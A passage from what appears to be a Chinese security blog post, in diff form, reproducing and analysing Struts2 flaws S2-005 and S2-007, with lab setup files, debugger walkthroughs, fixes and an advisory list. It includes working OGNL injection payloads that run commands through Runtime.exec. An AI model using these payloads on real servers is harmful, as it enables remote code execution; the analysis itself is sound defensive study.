+<p><code>excludeProperties</code>、<code>acceptProperties</code>是如何影响我们的代码执行的，具体需要跟进<code>Ognl</code>表达式执行JAVA代码的具体逻辑里面。需要到<code>ognl</code>的库中(<code>ognl-2.6.11.jar</code>)<code>ognl.OgnlRuntime#callAppropriateMethod</code>这个方法去看。</p>
+<p>在这个<code>ognl.OgnlRuntime#callAppropriateMethod</code>下个断点同时发送弹计算器的POC进行跟踪：</p>
+<p>可以发现当对<code>(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#39;)(bla)(bla)</code>解析执行到下图红框位置的时候，就会执行弹计算器的效果。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/44.png" srcset="/img/loading.gif"></p>
+<p>跟进<code>invokeMethod</code>方法，可以发现是采用反射的方式进行JAVA代码的执行。这就是<code>Ognl.setValue</code>和<code>Ognl.getValue</code>方法执行JAVA代码的原因。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/45.png" srcset="/img/loading.gif"></p>
+<p>回到<code>callAppropriateMethod</code>方法，我们可以发现要想调用<code>invokeMethod</code>方法进而进行JAVA代码的命令执行，我们需要进入<code>try</code>语句中，同时不能进入到如下<code>if</code>条件语句中，否则会抛出<code>NoSuchMethodException</code>异常，从而无法到<code>invokeMethod</code>方法处进行处理，也就无法进行JAVA代码的执行进而命令执行了。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/46.png" srcset="/img/loading.gif"></p>
+<p>进入到这个<code>if</code>条件判断语句块中需要满足两个条件，一个是<code>method</code>为<code>null</code>，另一个条件是<code>isMethodAccessible</code>方法返回<code>false</code>。第一个条件我们是不会满足的，因此注重第二个条件，<strong>我们需要让<code>isMethodAccessible</code>返回true</strong>。</p>
+<p>跟进<code>isMethodAccessible</code>看一下，首先程序会先调用我们的上下文<code>OgnlContext</code>对象的<code>getMemberAccess</code>方法</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/47.png" srcset="/img/loading.gif"></p>
+<p>跟进<code>getMemberAccess</code>方法，可以发现程序会获取<code>OgnlContext</code>上下文的<code>SecurityMemberAccess</code>对象，也就是这次补丁新增的对象，并将其返回。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/48.png" srcset="/img/loading.gif"></p>
+<p>接着就是调用<code>isAccessiable</code>，跟进看一下：仔细一看，我们可以知道，如果要返回<code>true</code>的话。我们决不能进入到下图两个<code>if</code>条件语句块中（红叉处），其中<code>this.getAllowStaticMethodAccess()</code>是我们可以控制的，因为<code>allowStaticMethodAccess</code>默认为<code>true</code>（即使不是默认为<code>true</code>，我们也可以利用ognl表达式修改它的值）。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/49.png" srcset="/img/loading.gif"></p>
+<p>同时我们要保证<code>this.isAcceptableProperty(propertyName)</code>返回<code>true</code>。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/50.png" srcset="/img/loading.gif"></p>
+<p>如下两张图分别是<code>isAccepted</code>和<code>isExcluded</code>方法，仔细审计可以知道要满足以上的<code>isAccepted</code>返回<code>true</code>和<code>isExcluded</code>返回<code>false</code>的条件是<code>acceptProperties</code>和<code>excludeProperties</code>都为空。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/51.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/52.png" srcset="/img/loading.gif"></p>
+<p>其中<code>acceptProperties</code>默认为空，因此我们只要设置<code>excludeProperties</code>为空即可。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/53.png" srcset="/img/loading.gif"></p>
+<p>那我们如何通过外部引用来设置<code>excludeProperties</code>的值呢？这个我一直没想到是如何做到的，我只能看<a target="_blank" rel="noopener" href="https://zhzhdoai.github.io/2020/12/24/Struts2%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B9%8BS2-005/">大佬的文章</a>[捂脸]一步一步调试。</p>
+<blockquote>
+<p>了解外部引用对象逻辑需要跟进<code>ASTVarRef::geValueBody=&gt;OgnlContext::get</code>,通过<code>#_memberAccess</code>就能够获取<code>SecurityMemberAccess</code>对象，就能够进一步修改<code>this.acceptProperties=false</code></p>
+</blockquote>
+<h3 id="5-漏洞修复-1"><a href="#5-漏洞修复-1" class="headerlink" title="5.漏洞修复"></a>5.漏洞修复</h3><p>修复代码最终使用了更加严格的正则 <code>[a-zA-Z0-9\\.\\]\\[\\(\\)_&#39;\\s]+</code> 来校验参数名的合法性。</p>
+<h2 id="4-Struts2-007"><a href="#4-Struts2-007" class="headerlink" title="4.Struts2-007"></a>4.Struts2-007</h2><h3 id="1-漏洞概要-2"><a href="#1-漏洞概要-2" class="headerlink" title="1.漏洞概要"></a>1.漏洞概要</h3><p>Struts2-007是一个远程代码执行漏洞。</p>
+<p>影响版本： <strong>Struts 2.0.0 - Struts 2.2.3</strong> 。更多详情可参考官方通告：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-007">https://cwiki.apache.org/confluence/display/WW/S2-007</a></p>
+<p><strong>当出现转换错误时，用户输入被评估为OGNL表达式</strong></p>
+<h3 id="2-漏洞环境搭建-2"><a href="#2-漏洞环境搭建-2" class="headerlink" title="2.漏洞环境搭建"></a>2.漏洞环境搭建</h3><p>Tomcat 8.5.64 + Struts2.2.3</p>
+<p>以下是漏洞复现的必备文件。</p>
+<p>index.jsp：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%--<br>  Created by IntelliJ IDEA.<br>  User: reader-l<br>  Date: <span class="hljs-number">2021</span>/<span class="hljs-number">6</span>/<span class="hljs-number">30</span><br>  Time: 上午<span class="hljs-number">8</span>:<span class="hljs-number">52</span><br>  To change <span class="hljs-keyword">this</span> template use File | Settings | File Templates.<br>--%&gt;<br>&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span><br>         pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">&quot;s&quot;</span> uri=<span class="hljs-string">&quot;/struts-tags&quot;</span> %&gt;<br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>  &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;<br>  &lt;title&gt;S2-007&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h2&gt;S2-007 Demo&lt;/h2&gt;<br>&lt;p&gt;link: &lt;a href=<span class="hljs-string">&quot;https://struts.apache.org/docs/s2-007.html&quot;</span>&gt;https:<span class="hljs-comment">//struts.apache.org/docs/s2-007.html&lt;/a&gt;&lt;/p&gt;</span><br><br>&lt;s:form action=<span class="hljs-string">&quot;login&quot;</span>&gt;<br>  &lt;s:textfield name=<span class="hljs-string">&quot;username&quot;</span> label=<span class="hljs-string">&quot;password&quot;</span> /&gt;<br>  &lt;s:textfield name=<span class="hljs-string">&quot;password&quot;</span> label=<span class="hljs-string">&quot;password&quot;</span> /&gt;<br>  &lt;s:textfield name=<span class="hljs-string">&quot;age&quot;</span> label=<span class="hljs-string">&quot;age&quot;</span> /&gt;<br>  &lt;s:submit&gt;&lt;/s:submit&gt;<br>&lt;/s:form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+<p>web.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;WebApp_ID&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;3.1&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>S2-007 Example<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>struts.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta">        <span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- &lt;constant name=&quot;struts.enable.DynamicMethodInvocation&quot; value=&quot;true&quot; /&gt; --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.devMode&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span> /&gt;</span><br>    <span class="hljs-comment">&lt;!-- Add packages here --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;S2-007&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;action.LoginAction&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span>&gt;</span>/index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;input&quot;</span>&gt;</span>/index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><span class="hljs-comment">&lt;!-- 这一行一定写入不然会报错--&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="3-漏洞复现-3"><a href="#3-漏洞复现-3" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h3><p>S2-007的利用场景比较苛刻，要求对提交的参数配置了验证规则并对提交的参数进行类型转换的时候会造成OGNL表达式的执行。</p>
+<p>本地弹计算器验证POC：</p>
+<figure class="highlight purebasic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs purebasic">&#x27; + (<span class="hljs-symbol">#_memberAccess</span>[<span class="hljs-string">&quot;allowStaticMethodAccess&quot;</span>]=true,<span class="hljs-symbol">#foo</span>=new java.lang.Boolean(<span class="hljs-string">&quot;false&quot;</span>) ,<span class="hljs-symbol">#context</span>[<span class="hljs-string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]=<span class="hljs-symbol">#foo</span>,@java.lang.<span class="hljs-keyword">Runtime</span>@getRuntime().exec(<span class="hljs-string">&quot;deepin-calculator&quot;</span>)) + &#x27;<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/55.png" srcset="/img/loading.gif"></p>
+<p>命令回显EXP：</p>
+<figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scala">&#x27; + (#_memberAccess[<span class="hljs-string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="hljs-literal">true</span>,#foo=<span class="hljs-keyword">new</span> java.lang.<span class="hljs-type">Boolean</span>(<span class="hljs-string">&quot;false&quot;</span>) ,#context[<span class="hljs-string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]=#foo,<span class="hljs-meta">@org</span>.apache.commons.io.<span class="hljs-type">IOUtils</span><span class="hljs-meta">@toString</span>(<span class="hljs-meta">@java</span>.lang.<span class="hljs-type">Runtime</span><span class="hljs-meta">@getRuntime</span>().exec(<span class="hljs-symbol">&#x27;i</span>d&#x27;).getInputStream())) + &#x27;<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/54.png" srcset="/img/loading.gif"></p>
+<h3 id="4-漏洞分析-3"><a href="#4-漏洞分析-3" class="headerlink" title="4.漏洞分析"></a>4.漏洞分析</h3><p>通过查看官方关于漏洞的描述，可以发现漏洞是出现在<code>ConversionErrorInterceptor</code>这个处理类型转换错误的拦截器中</p>
+<p><a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/WW-3668">https://issues.apache.org/jira/browse/WW-3668</a></p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/56.png" srcset="/img/loading.gif"></p>
+<p>我们在这个拦截器的<code>intercept</code>方法中下个断点调试查看：</p>
+<p>可以发现程序会将用户输入的值存入<code>fakie</code>变量，同时在存入之前，会将用户输入的值用<code>getOverrideExpr</code>方法来处理。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/57.png" srcset="/img/loading.gif"></p>
+<p>我们跟进<code>getOverrideExpr</code>方法：在 <strong>getOverrideExpr</strong> 方法中，会在用户输入的值两边拼接上单引号，然后再将值存入刚刚的 <strong>fakie</strong> 变量。这也是我们的payload两边加上单引号的原因—-&gt;闭合单引号。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/58.png" srcset="/img/loading.gif"></p>
+<p>接着程序会调用<code>setExprOberrides</code>方法把 <strong>fakie</strong> 变量存入 <strong>OgnlValueStack.overrides</strong> 变量中。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/59.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/60.png" srcset="/img/loading.gif"></p>
+<p>然后在解析到 <code>Struts2</code> 结束标签时（<code>org.apache.struts2.views.jsp.ComponentTagSupport#doEndTag</code>），会将用户输入值经过 <code>OGNL</code> 执行并返回。如果先前 <code>OgnlValueStack.overrides</code> 存储过相关字段，则会先从 <code>OgnlValueStack.overrides</code> 中取出相关值，然后再通过 <code>OGNL</code> 执行，代码执行也就发生在此处。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/61.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/62.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/63.png" srcset="/img/loading.gif"></p>
+<h3 id="5-漏洞修复-2"><a href="#5-漏洞修复-2" class="headerlink" title="5.漏洞修复"></a>5.漏洞修复</h3><p>​    版本struts2-2.2.3.1中利用<code>org.apache.commons.lang.StringEscapeUtils.escapeJava</code>过滤字符串,转义字符串,防止单引号逃逸.</p>
+<h1 id="3-参考文章"><a href="#3-参考文章" class="headerlink" title="3.参考文章"></a>3.参考文章</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/217482.html">https://www.freebuf.com/vuls/217482.html</a></p>
+<h1 id="4-Struts2官方漏洞目录链接"><a href="#4-Struts2官方漏洞目录链接" class="headerlink" title="4.Struts2官方漏洞目录链接"></a>4.Struts2官方漏洞目录链接</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-001">S2-001</a> - 远程代码利用表单验证错误</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-002">S2-002</a> - &lt;s：url&gt;和&lt;s：a&gt;标记上的跨站点脚本（XSS）漏洞</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-003">S2-003</a> - XWork ParameterInterceptors旁路允许OGNL语句执行</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-004">S2-004</a> - 提供静态内容时的目录遍历漏洞</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-005">S2-005</a> - XWork ParameterInterceptors旁路允许远程命令执行</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-006">S2-006</a> - XWork中的多个跨站点脚本（XSS）生成错误页面</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-007">S2-007</a> - 当出现转换错误时，用户输入被评估为OGNL表达式</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-008">S2-008</a> - Struts2中的多个关键漏洞</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-009">S2-009</a> - ParameterInterceptor漏洞允许远程命令执行</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-010">S2-010</a> - 当使用Struts 2令牌机制进行CSRF保护时，可能会因滥用已知会话属性而绕过令牌检查</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-011">S2-011</a> - 长请求参数名称可能会显着提高DOS攻击的有效性</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-012">S2-012</a> - 展示应用程序漏洞允许远程命令执行</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-013">S2-013</a> - URL和锚标记的includeParams属性中存在的漏洞允许远程命令执行</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-014">S2-014</a> - 强制参数包含在URL和锚标记中引入的漏洞允许远程命令执行，会话访问和操作以及XSS攻击</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-015">S2-015</a> - 通配符匹配机制引入的漏洞或OGNL表达式的双重评估允许远程命令执行。</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-016">S2-016</a> - 通过操作前缀为“action：”/“redirect：”/“redirectAction：”的参数引入的漏洞允许远程命令执行</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-017">S2-017</a> - 通过操作前缀为“redirect：”/“redirectAction：”的参数引入的漏洞允许打开重定向</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-018">S2-018</a> - Apache Struts2中的访问控制漏洞</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-019">S2-019</a> - 默认情况下禁用动态方法调用</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-020">S2-020</a> - 将Commons FileUpload升级到版本1.3.1（避免DoS攻击）并添加’class’以排除ParametersInterceptor中的params（避免ClassLoader操作）</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-021">S2-021</a> - 改进了ParametersInterceptor和CookieInterceptor中被排除的参数，以避免ClassLoader操作</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-022">S2-022</a> - 在CookieInterceptor中扩展排除的params以避免操纵Struts的内部</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-023">S2-023</a> - 令牌的生成值可以预测</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-024">S2-024</a> - 错误的excludeParams会覆盖DefaultExcludedPatternsChecker中定义的那些</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-025">S2-025</a> - 调试模式和公开的JSP文件中的跨站点脚本漏洞</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-026">S2-026</a> - 特殊顶级对象可用于访问Struts的内部</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-027">S2-027</a> - TextParseUtil.translateVariables不过滤恶意OGNL表达式</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-028">S2-028</a> - 使用具有损坏的URLDecoder实现的JRE可能会导致基于Struts 2的Web应用程序中的XSS漏洞。</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-029">S2-029</a> - 在标记属性中对原始用户输入进行评估时，强制双OGNL评估可能导致远程代码执行。</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-030">S2-030</a> - <a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-030">I18NInterceptor中</a>可能的XSS漏洞</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-031">S2-031</a> - XSLTResult可用于解析任意样式表</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-032">S2-032</a> - 启用动态方法调用时，可以通过方法：前缀执行远程执行代码。</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-033">S2-033</a> - 使用REST插件时可以执行远程执行代码！启用动态方法调用时的运算符。</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-034">S2-034</a> - OGNL缓存中毒可能导致DoS漏洞</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-035">S2-035</a> - 动作名称清理容易出错</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-036">S2-036</a> - 在标签属性中对原始用户输入进行评估时，强制双OGNL评估可能导致远程代码执行（类似于S2-029）</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-037">S2-037</a> - 使用REST插件时可以执行远程执行代码。</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-038">S2-038</a> - 可以绕过令牌验证并执行CSRF攻击</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-039">S2-039</a> - Getter作为行动方法导致安全绕过</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-040">S2-040</a> - 使用现有默认操作方法输入验证绕过。</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-041">S2-041</a> - 使用URLValidator时可能发生DoS攻击</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-042">S2-042</a> - “公约”插件中可能的路径遍历</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-043">S2-043</a> - 在生产中使用Config Browser插件</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-044">S2-044</a> - 使用URLValidator时可能发生DoS攻击</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-045">S2-045</a> - 基于Jakarta Multipart解析器执行文件上载时可能的远程执行代码。</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-046">S2-046</a> - 基于Jakarta Multipart解析器执行文件上传时可能的RCE（类似于S2-045）</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-047">S2-047</a> - 使用URLValidator时可能发生DoS攻击（类似于S2-044）</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-048">S2-048</a> - Struts 2.3.x系列中Struts 1插件示例中的Struts Showcase应用程序中可能的RCE</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-049">S2-049</a> - DoS攻击可用于Spring安全操作</li>
